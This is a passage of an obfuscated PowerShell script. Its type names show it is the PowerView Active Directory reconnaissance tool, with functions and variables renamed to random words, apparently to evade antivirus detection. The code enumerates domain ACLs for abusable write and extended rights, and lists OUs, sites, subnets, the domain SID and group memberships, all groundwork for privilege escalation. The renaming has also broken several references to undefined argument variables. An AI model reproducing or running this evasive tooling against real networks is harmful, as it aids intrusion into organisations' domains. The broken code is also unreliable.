        $vaIHORHD99,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $XvtxnAdg99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $rMfAPmUL99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $rMfAPmUL99['ResolveGUIDs'] = $vaIHORHD99 }
        if ($PSBoundParameters['RightsFilter']) { $rMfAPmUL99['RightsFilter'] = $XvtxnAdg99 }
        if ($PSBoundParameters['LDAPFilter']) { $rMfAPmUL99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $rMfAPmUL99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $rMfAPmUL99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $rMfAPmUL99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $rMfAPmUL99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rMfAPmUL99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $rMfAPmUL99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $rMfAPmUL99['Credential'] = $DOZPHpup99 }
        $mLlokiUt99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $mLlokiUt99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $mLlokiUt99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $mLlokiUt99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $mLlokiUt99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $mLlokiUt99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $mLlokiUt99['Credential'] = $DOZPHpup99 }
        $WYZNomjg99 = @{}
        if ($PSBoundParameters['Server']) { $WYZNomjg99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['Credential']) { $WYZNomjg99['Credential'] = $DOZPHpup99 }
        $HfDgFzmM99 = @{}
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $rMfAPmUL99['Domain'] = $jeGdZvYa99
            $WYZNomjg99['Domain'] = $jeGdZvYa99
        }
        annihilated @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($HfDgFzmM99[$_.SecurityIdentifier.Value]) {
                        $sZlbpDfy99, $gVeeMGXi99, $UQSJsEGP99, $ZOuVVgZy99 = $HfDgFzmM99[$_.SecurityIdentifier.Value]
                        $twTnfwtc99 = New-Object PSObject
                        $twTnfwtc99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $twTnfwtc99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $twTnfwtc99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $twTnfwtc99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $twTnfwtc99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $twTnfwtc99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $twTnfwtc99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $twTnfwtc99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $twTnfwtc99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $twTnfwtc99 | Add-Member NoteProperty 'IdentityReferenceName' $sZlbpDfy99
                        $twTnfwtc99 | Add-Member NoteProperty 'IdentityReferenceDomain' $gVeeMGXi99
                        $twTnfwtc99 | Add-Member NoteProperty 'IdentityReferenceDN' $UQSJsEGP99
                        $twTnfwtc99 | Add-Member NoteProperty 'IdentityReferenceClass' $ZOuVVgZy99
                        $twTnfwtc99
                    }
                    else {
                        $UQSJsEGP99 = intrenches -fqOhNdkk99 $_.SecurityIdentifier.Value -vxxrLejt99 DN @ADNameArguments
                        if ($UQSJsEGP99) {
                            $gVeeMGXi99 = $UQSJsEGP99.SubString($UQSJsEGP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $mLlokiUt99['Domain'] = $gVeeMGXi99
                            $mLlokiUt99['Identity'] = $UQSJsEGP99
                            $Object = cupped @ObjectSearcherArguments
                            if ($Object) {
                                $sZlbpDfy99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $ZOuVVgZy99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $ZOuVVgZy99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $ZOuVVgZy99 = 'user'
                                }
                                else {
                                    $ZOuVVgZy99 = $Null
                                }
                                $HfDgFzmM99[$_.SecurityIdentifier.Value] = $sZlbpDfy99, $gVeeMGXi99, $UQSJsEGP99, $ZOuVVgZy99
                                $twTnfwtc99 = New-Object PSObject
                                $twTnfwtc99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $twTnfwtc99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $twTnfwtc99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $twTnfwtc99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $twTnfwtc99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $twTnfwtc99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $twTnfwtc99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $twTnfwtc99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $twTnfwtc99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $twTnfwtc99 | Add-Member NoteProperty 'IdentityReferenceName' $sZlbpDfy99
                                $twTnfwtc99 | Add-Member NoteProperty 'IdentityReferenceDomain' $gVeeMGXi99
                                $twTnfwtc99 | Add-Member NoteProperty 'IdentityReferenceDN' $UQSJsEGP99
                                $twTnfwtc99 | Add-Member NoteProperty 'IdentityReferenceClass' $ZOuVVgZy99
                                $twTnfwtc99
                            }
                        }
                        else {
                            Write-Warning "[Gruyeres] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with intrenches"
                        }
                    }
                }
            }
        }
    }
}
function disproved {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $LOeOPkcr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $lChrSnZG99 = breading @SearcherArguments
    }
    PROCESS {
        if ($lChrSnZG99) {
            $waAVGUFD99 = ''
            $nQZyhrEp99 = ''
            $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($MFlrbkhb99 -match '^OU=.*') {
                    $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[disproved] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                        $zLdPCUTB99['Domain'] = $cIRoWbek99
                        $lChrSnZG99 = breading @SearcherArguments
                        if (-not $lChrSnZG99) {
                            Write-Warning "[disproved] Unable to retrieve domain searcher for '$cIRoWbek99'"
                        }
                    }
                }
                else {
                    try {
                        $yhPDRNjn99 = (-Join (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                    }
                    catch {
                        $waAVGUFD99 += "(name=$MFlrbkhb99)"
                    }
                }
            }
            if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                $nQZyhrEp99 += "(|$waAVGUFD99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[disproved] Searching for OUs with $LOeOPkcr99 set in the gpLink property"
                $nQZyhrEp99 += "(gplink=*$LOeOPkcr99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[disproved] Using additional LDAP filter: $gzpPmKdI99"
                $nQZyhrEp99 += "$gzpPmKdI99"
            }
            $lChrSnZG99.filter = "(&(objectCategory=organizationalUnit)$nQZyhrEp99)"
            Write-Verbose "[disproved] disproved filter string: $($lChrSnZG99.filter)"
            if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $lChrSnZG99.FindOne() }
            else { $NtqBcYnO99 = $lChrSnZG99.FindAll() }
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = decaffeinating -PvRupVWt99 $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[disproved] Error disposing of the Results object: $_"
                }
            }
            $lChrSnZG99.dispose()
        }
    }
}
function bandannas {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $LOeOPkcr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $zLdPCUTB99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $SeRPjmOw99 = breading @SearcherArguments
    }
    PROCESS {
        if ($SeRPjmOw99) {
            $waAVGUFD99 = ''
            $nQZyhrEp99 = ''
            $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($MFlrbkhb99 -match '^CN=.*') {
                    $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[bandannas] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                        $zLdPCUTB99['Domain'] = $cIRoWbek99
                        $SeRPjmOw99 = breading @SearcherArguments
                        if (-not $SeRPjmOw99) {
                            Write-Warning "[bandannas] Unable to retrieve domain searcher for '$cIRoWbek99'"
                        }
                    }
                }
                else {
                    try {
                        $yhPDRNjn99 = (-Join (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                    }
                    catch {
                        $waAVGUFD99 += "(name=$MFlrbkhb99)"
                    }
                }
            }
            if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                $nQZyhrEp99 += "(|$waAVGUFD99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[bandannas] Searching for sites with $LOeOPkcr99 set in the gpLink property"
                $nQZyhrEp99 += "(gplink=*$LOeOPkcr99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[bandannas] Using additional LDAP filter: $gzpPmKdI99"
                $nQZyhrEp99 += "$gzpPmKdI99"
            }
            $SeRPjmOw99.filter = "(&(objectCategory=site)$nQZyhrEp99)"
            Write-Verbose "[bandannas] bandannas filter string: $($SeRPjmOw99.filter)"
            if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $SeRPjmOw99.FindAll() }
            else { $NtqBcYnO99 = $SeRPjmOw99.FindAll() }
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = decaffeinating -PvRupVWt99 $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[bandannas] Error disposing of the Results object"
                }
            }
            $SeRPjmOw99.dispose()
        }
    }
}
function rich {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $TQljdANP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $zLdPCUTB99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $QyjRwPCJ99 = breading @SearcherArguments
    }
    PROCESS {
        if ($QyjRwPCJ99) {
            $waAVGUFD99 = ''
            $nQZyhrEp99 = ''
            $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($MFlrbkhb99 -match '^CN=.*') {
                    $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[rich] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                        $zLdPCUTB99['Domain'] = $cIRoWbek99
                        $QyjRwPCJ99 = breading @SearcherArguments
                        if (-not $QyjRwPCJ99) {
                            Write-Warning "[rich] Unable to retrieve domain searcher for '$cIRoWbek99'"
                        }
                    }
                }
                else {
                    try {
                        $yhPDRNjn99 = (-Join (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                    }
                    catch {
                        $waAVGUFD99 += "(name=$MFlrbkhb99)"
                    }
                }
            }
            if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                $nQZyhrEp99 += "(|$waAVGUFD99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[rich] Using additional LDAP filter: $gzpPmKdI99"
                $nQZyhrEp99 += "$gzpPmKdI99"
            }
            $QyjRwPCJ99.filter = "(&(objectCategory=subnet)$nQZyhrEp99)"
            Write-Verbose "[rich] rich filter string: $($QyjRwPCJ99.filter)"
            if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $QyjRwPCJ99.FindOne() }
            else { $NtqBcYnO99 = $QyjRwPCJ99.FindAll() }
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $WivJYInX99 = $_
                }
                else {
                    $WivJYInX99 = decaffeinating -PvRupVWt99 $_.Properties
                }
                $WivJYInX99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
                if ($PSBoundParameters['SiteName']) {
                    if ($WivJYInX99.properties -and ($WivJYInX99.properties.siteobject -like "*$TQljdANP99*")) {
                        $WivJYInX99
                    }
                    elseif ($WivJYInX99.siteobject -like "*$TQljdANP99*") {
                        $WivJYInX99
                    }
                }
                else {
                    $WivJYInX99
                }
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[rich] Error disposing of the Results object: $_"
                }
            }
            $QyjRwPCJ99.dispose()
        }
    }
}
function narcotic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    $zLdPCUTB99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
    if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
    if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
    $DCSID = boozed @SearcherArguments -fnsssdap99 | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[narcotic] Error extracting domain SID for '$jeGdZvYa99'"
    }
}
function deform {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $LlOLytFc99,
        [Switch]
        $LpLeJujw99,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $IGMJgJsz99,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $IafNKrBj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $dunucDiM99 = breading @SearcherArguments
    }
    PROCESS {
        if ($dunucDiM99) {
            if ($PSBoundParameters['MemberIdentity']) {
                if ($zLdPCUTB99['Properties']) {
                    $vqXskDQd99 = $zLdPCUTB99['Properties']
                }
                $zLdPCUTB99['Identity'] = $LlOLytFc99
                $zLdPCUTB99['Raw'] = $True
                cupped @SearcherArguments | ForEach-Object {
                    $jzHNIQUn99 = $_.GetDirectoryEntry()
                    $jzHNIQUn99.RefreshCache('tokenGroups')
                    $jzHNIQUn99.TokenGroups | ForEach-Object {
                        $NORXAZEg99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if ($NORXAZEg99 -notmatch '^S-1-5-32-.*') {
                            $zLdPCUTB99['Identity'] = $NORXAZEg99
                            $zLdPCUTB99['Raw'] = $False
                            if ($vqXskDQd99) { $zLdPCUTB99['Properties'] = $vqXskDQd99 }
                            $Group = cupped @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $waAVGUFD99 = ''
                $nQZyhrEp99 = ''
                $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                    $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($MFlrbkhb99 -match '^S-1-') {
                        $waAVGUFD99 += "(objectsid=$MFlrbkhb99)"
                    }
                    elseif ($MFlrbkhb99 -match '^CN=') {
                        $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
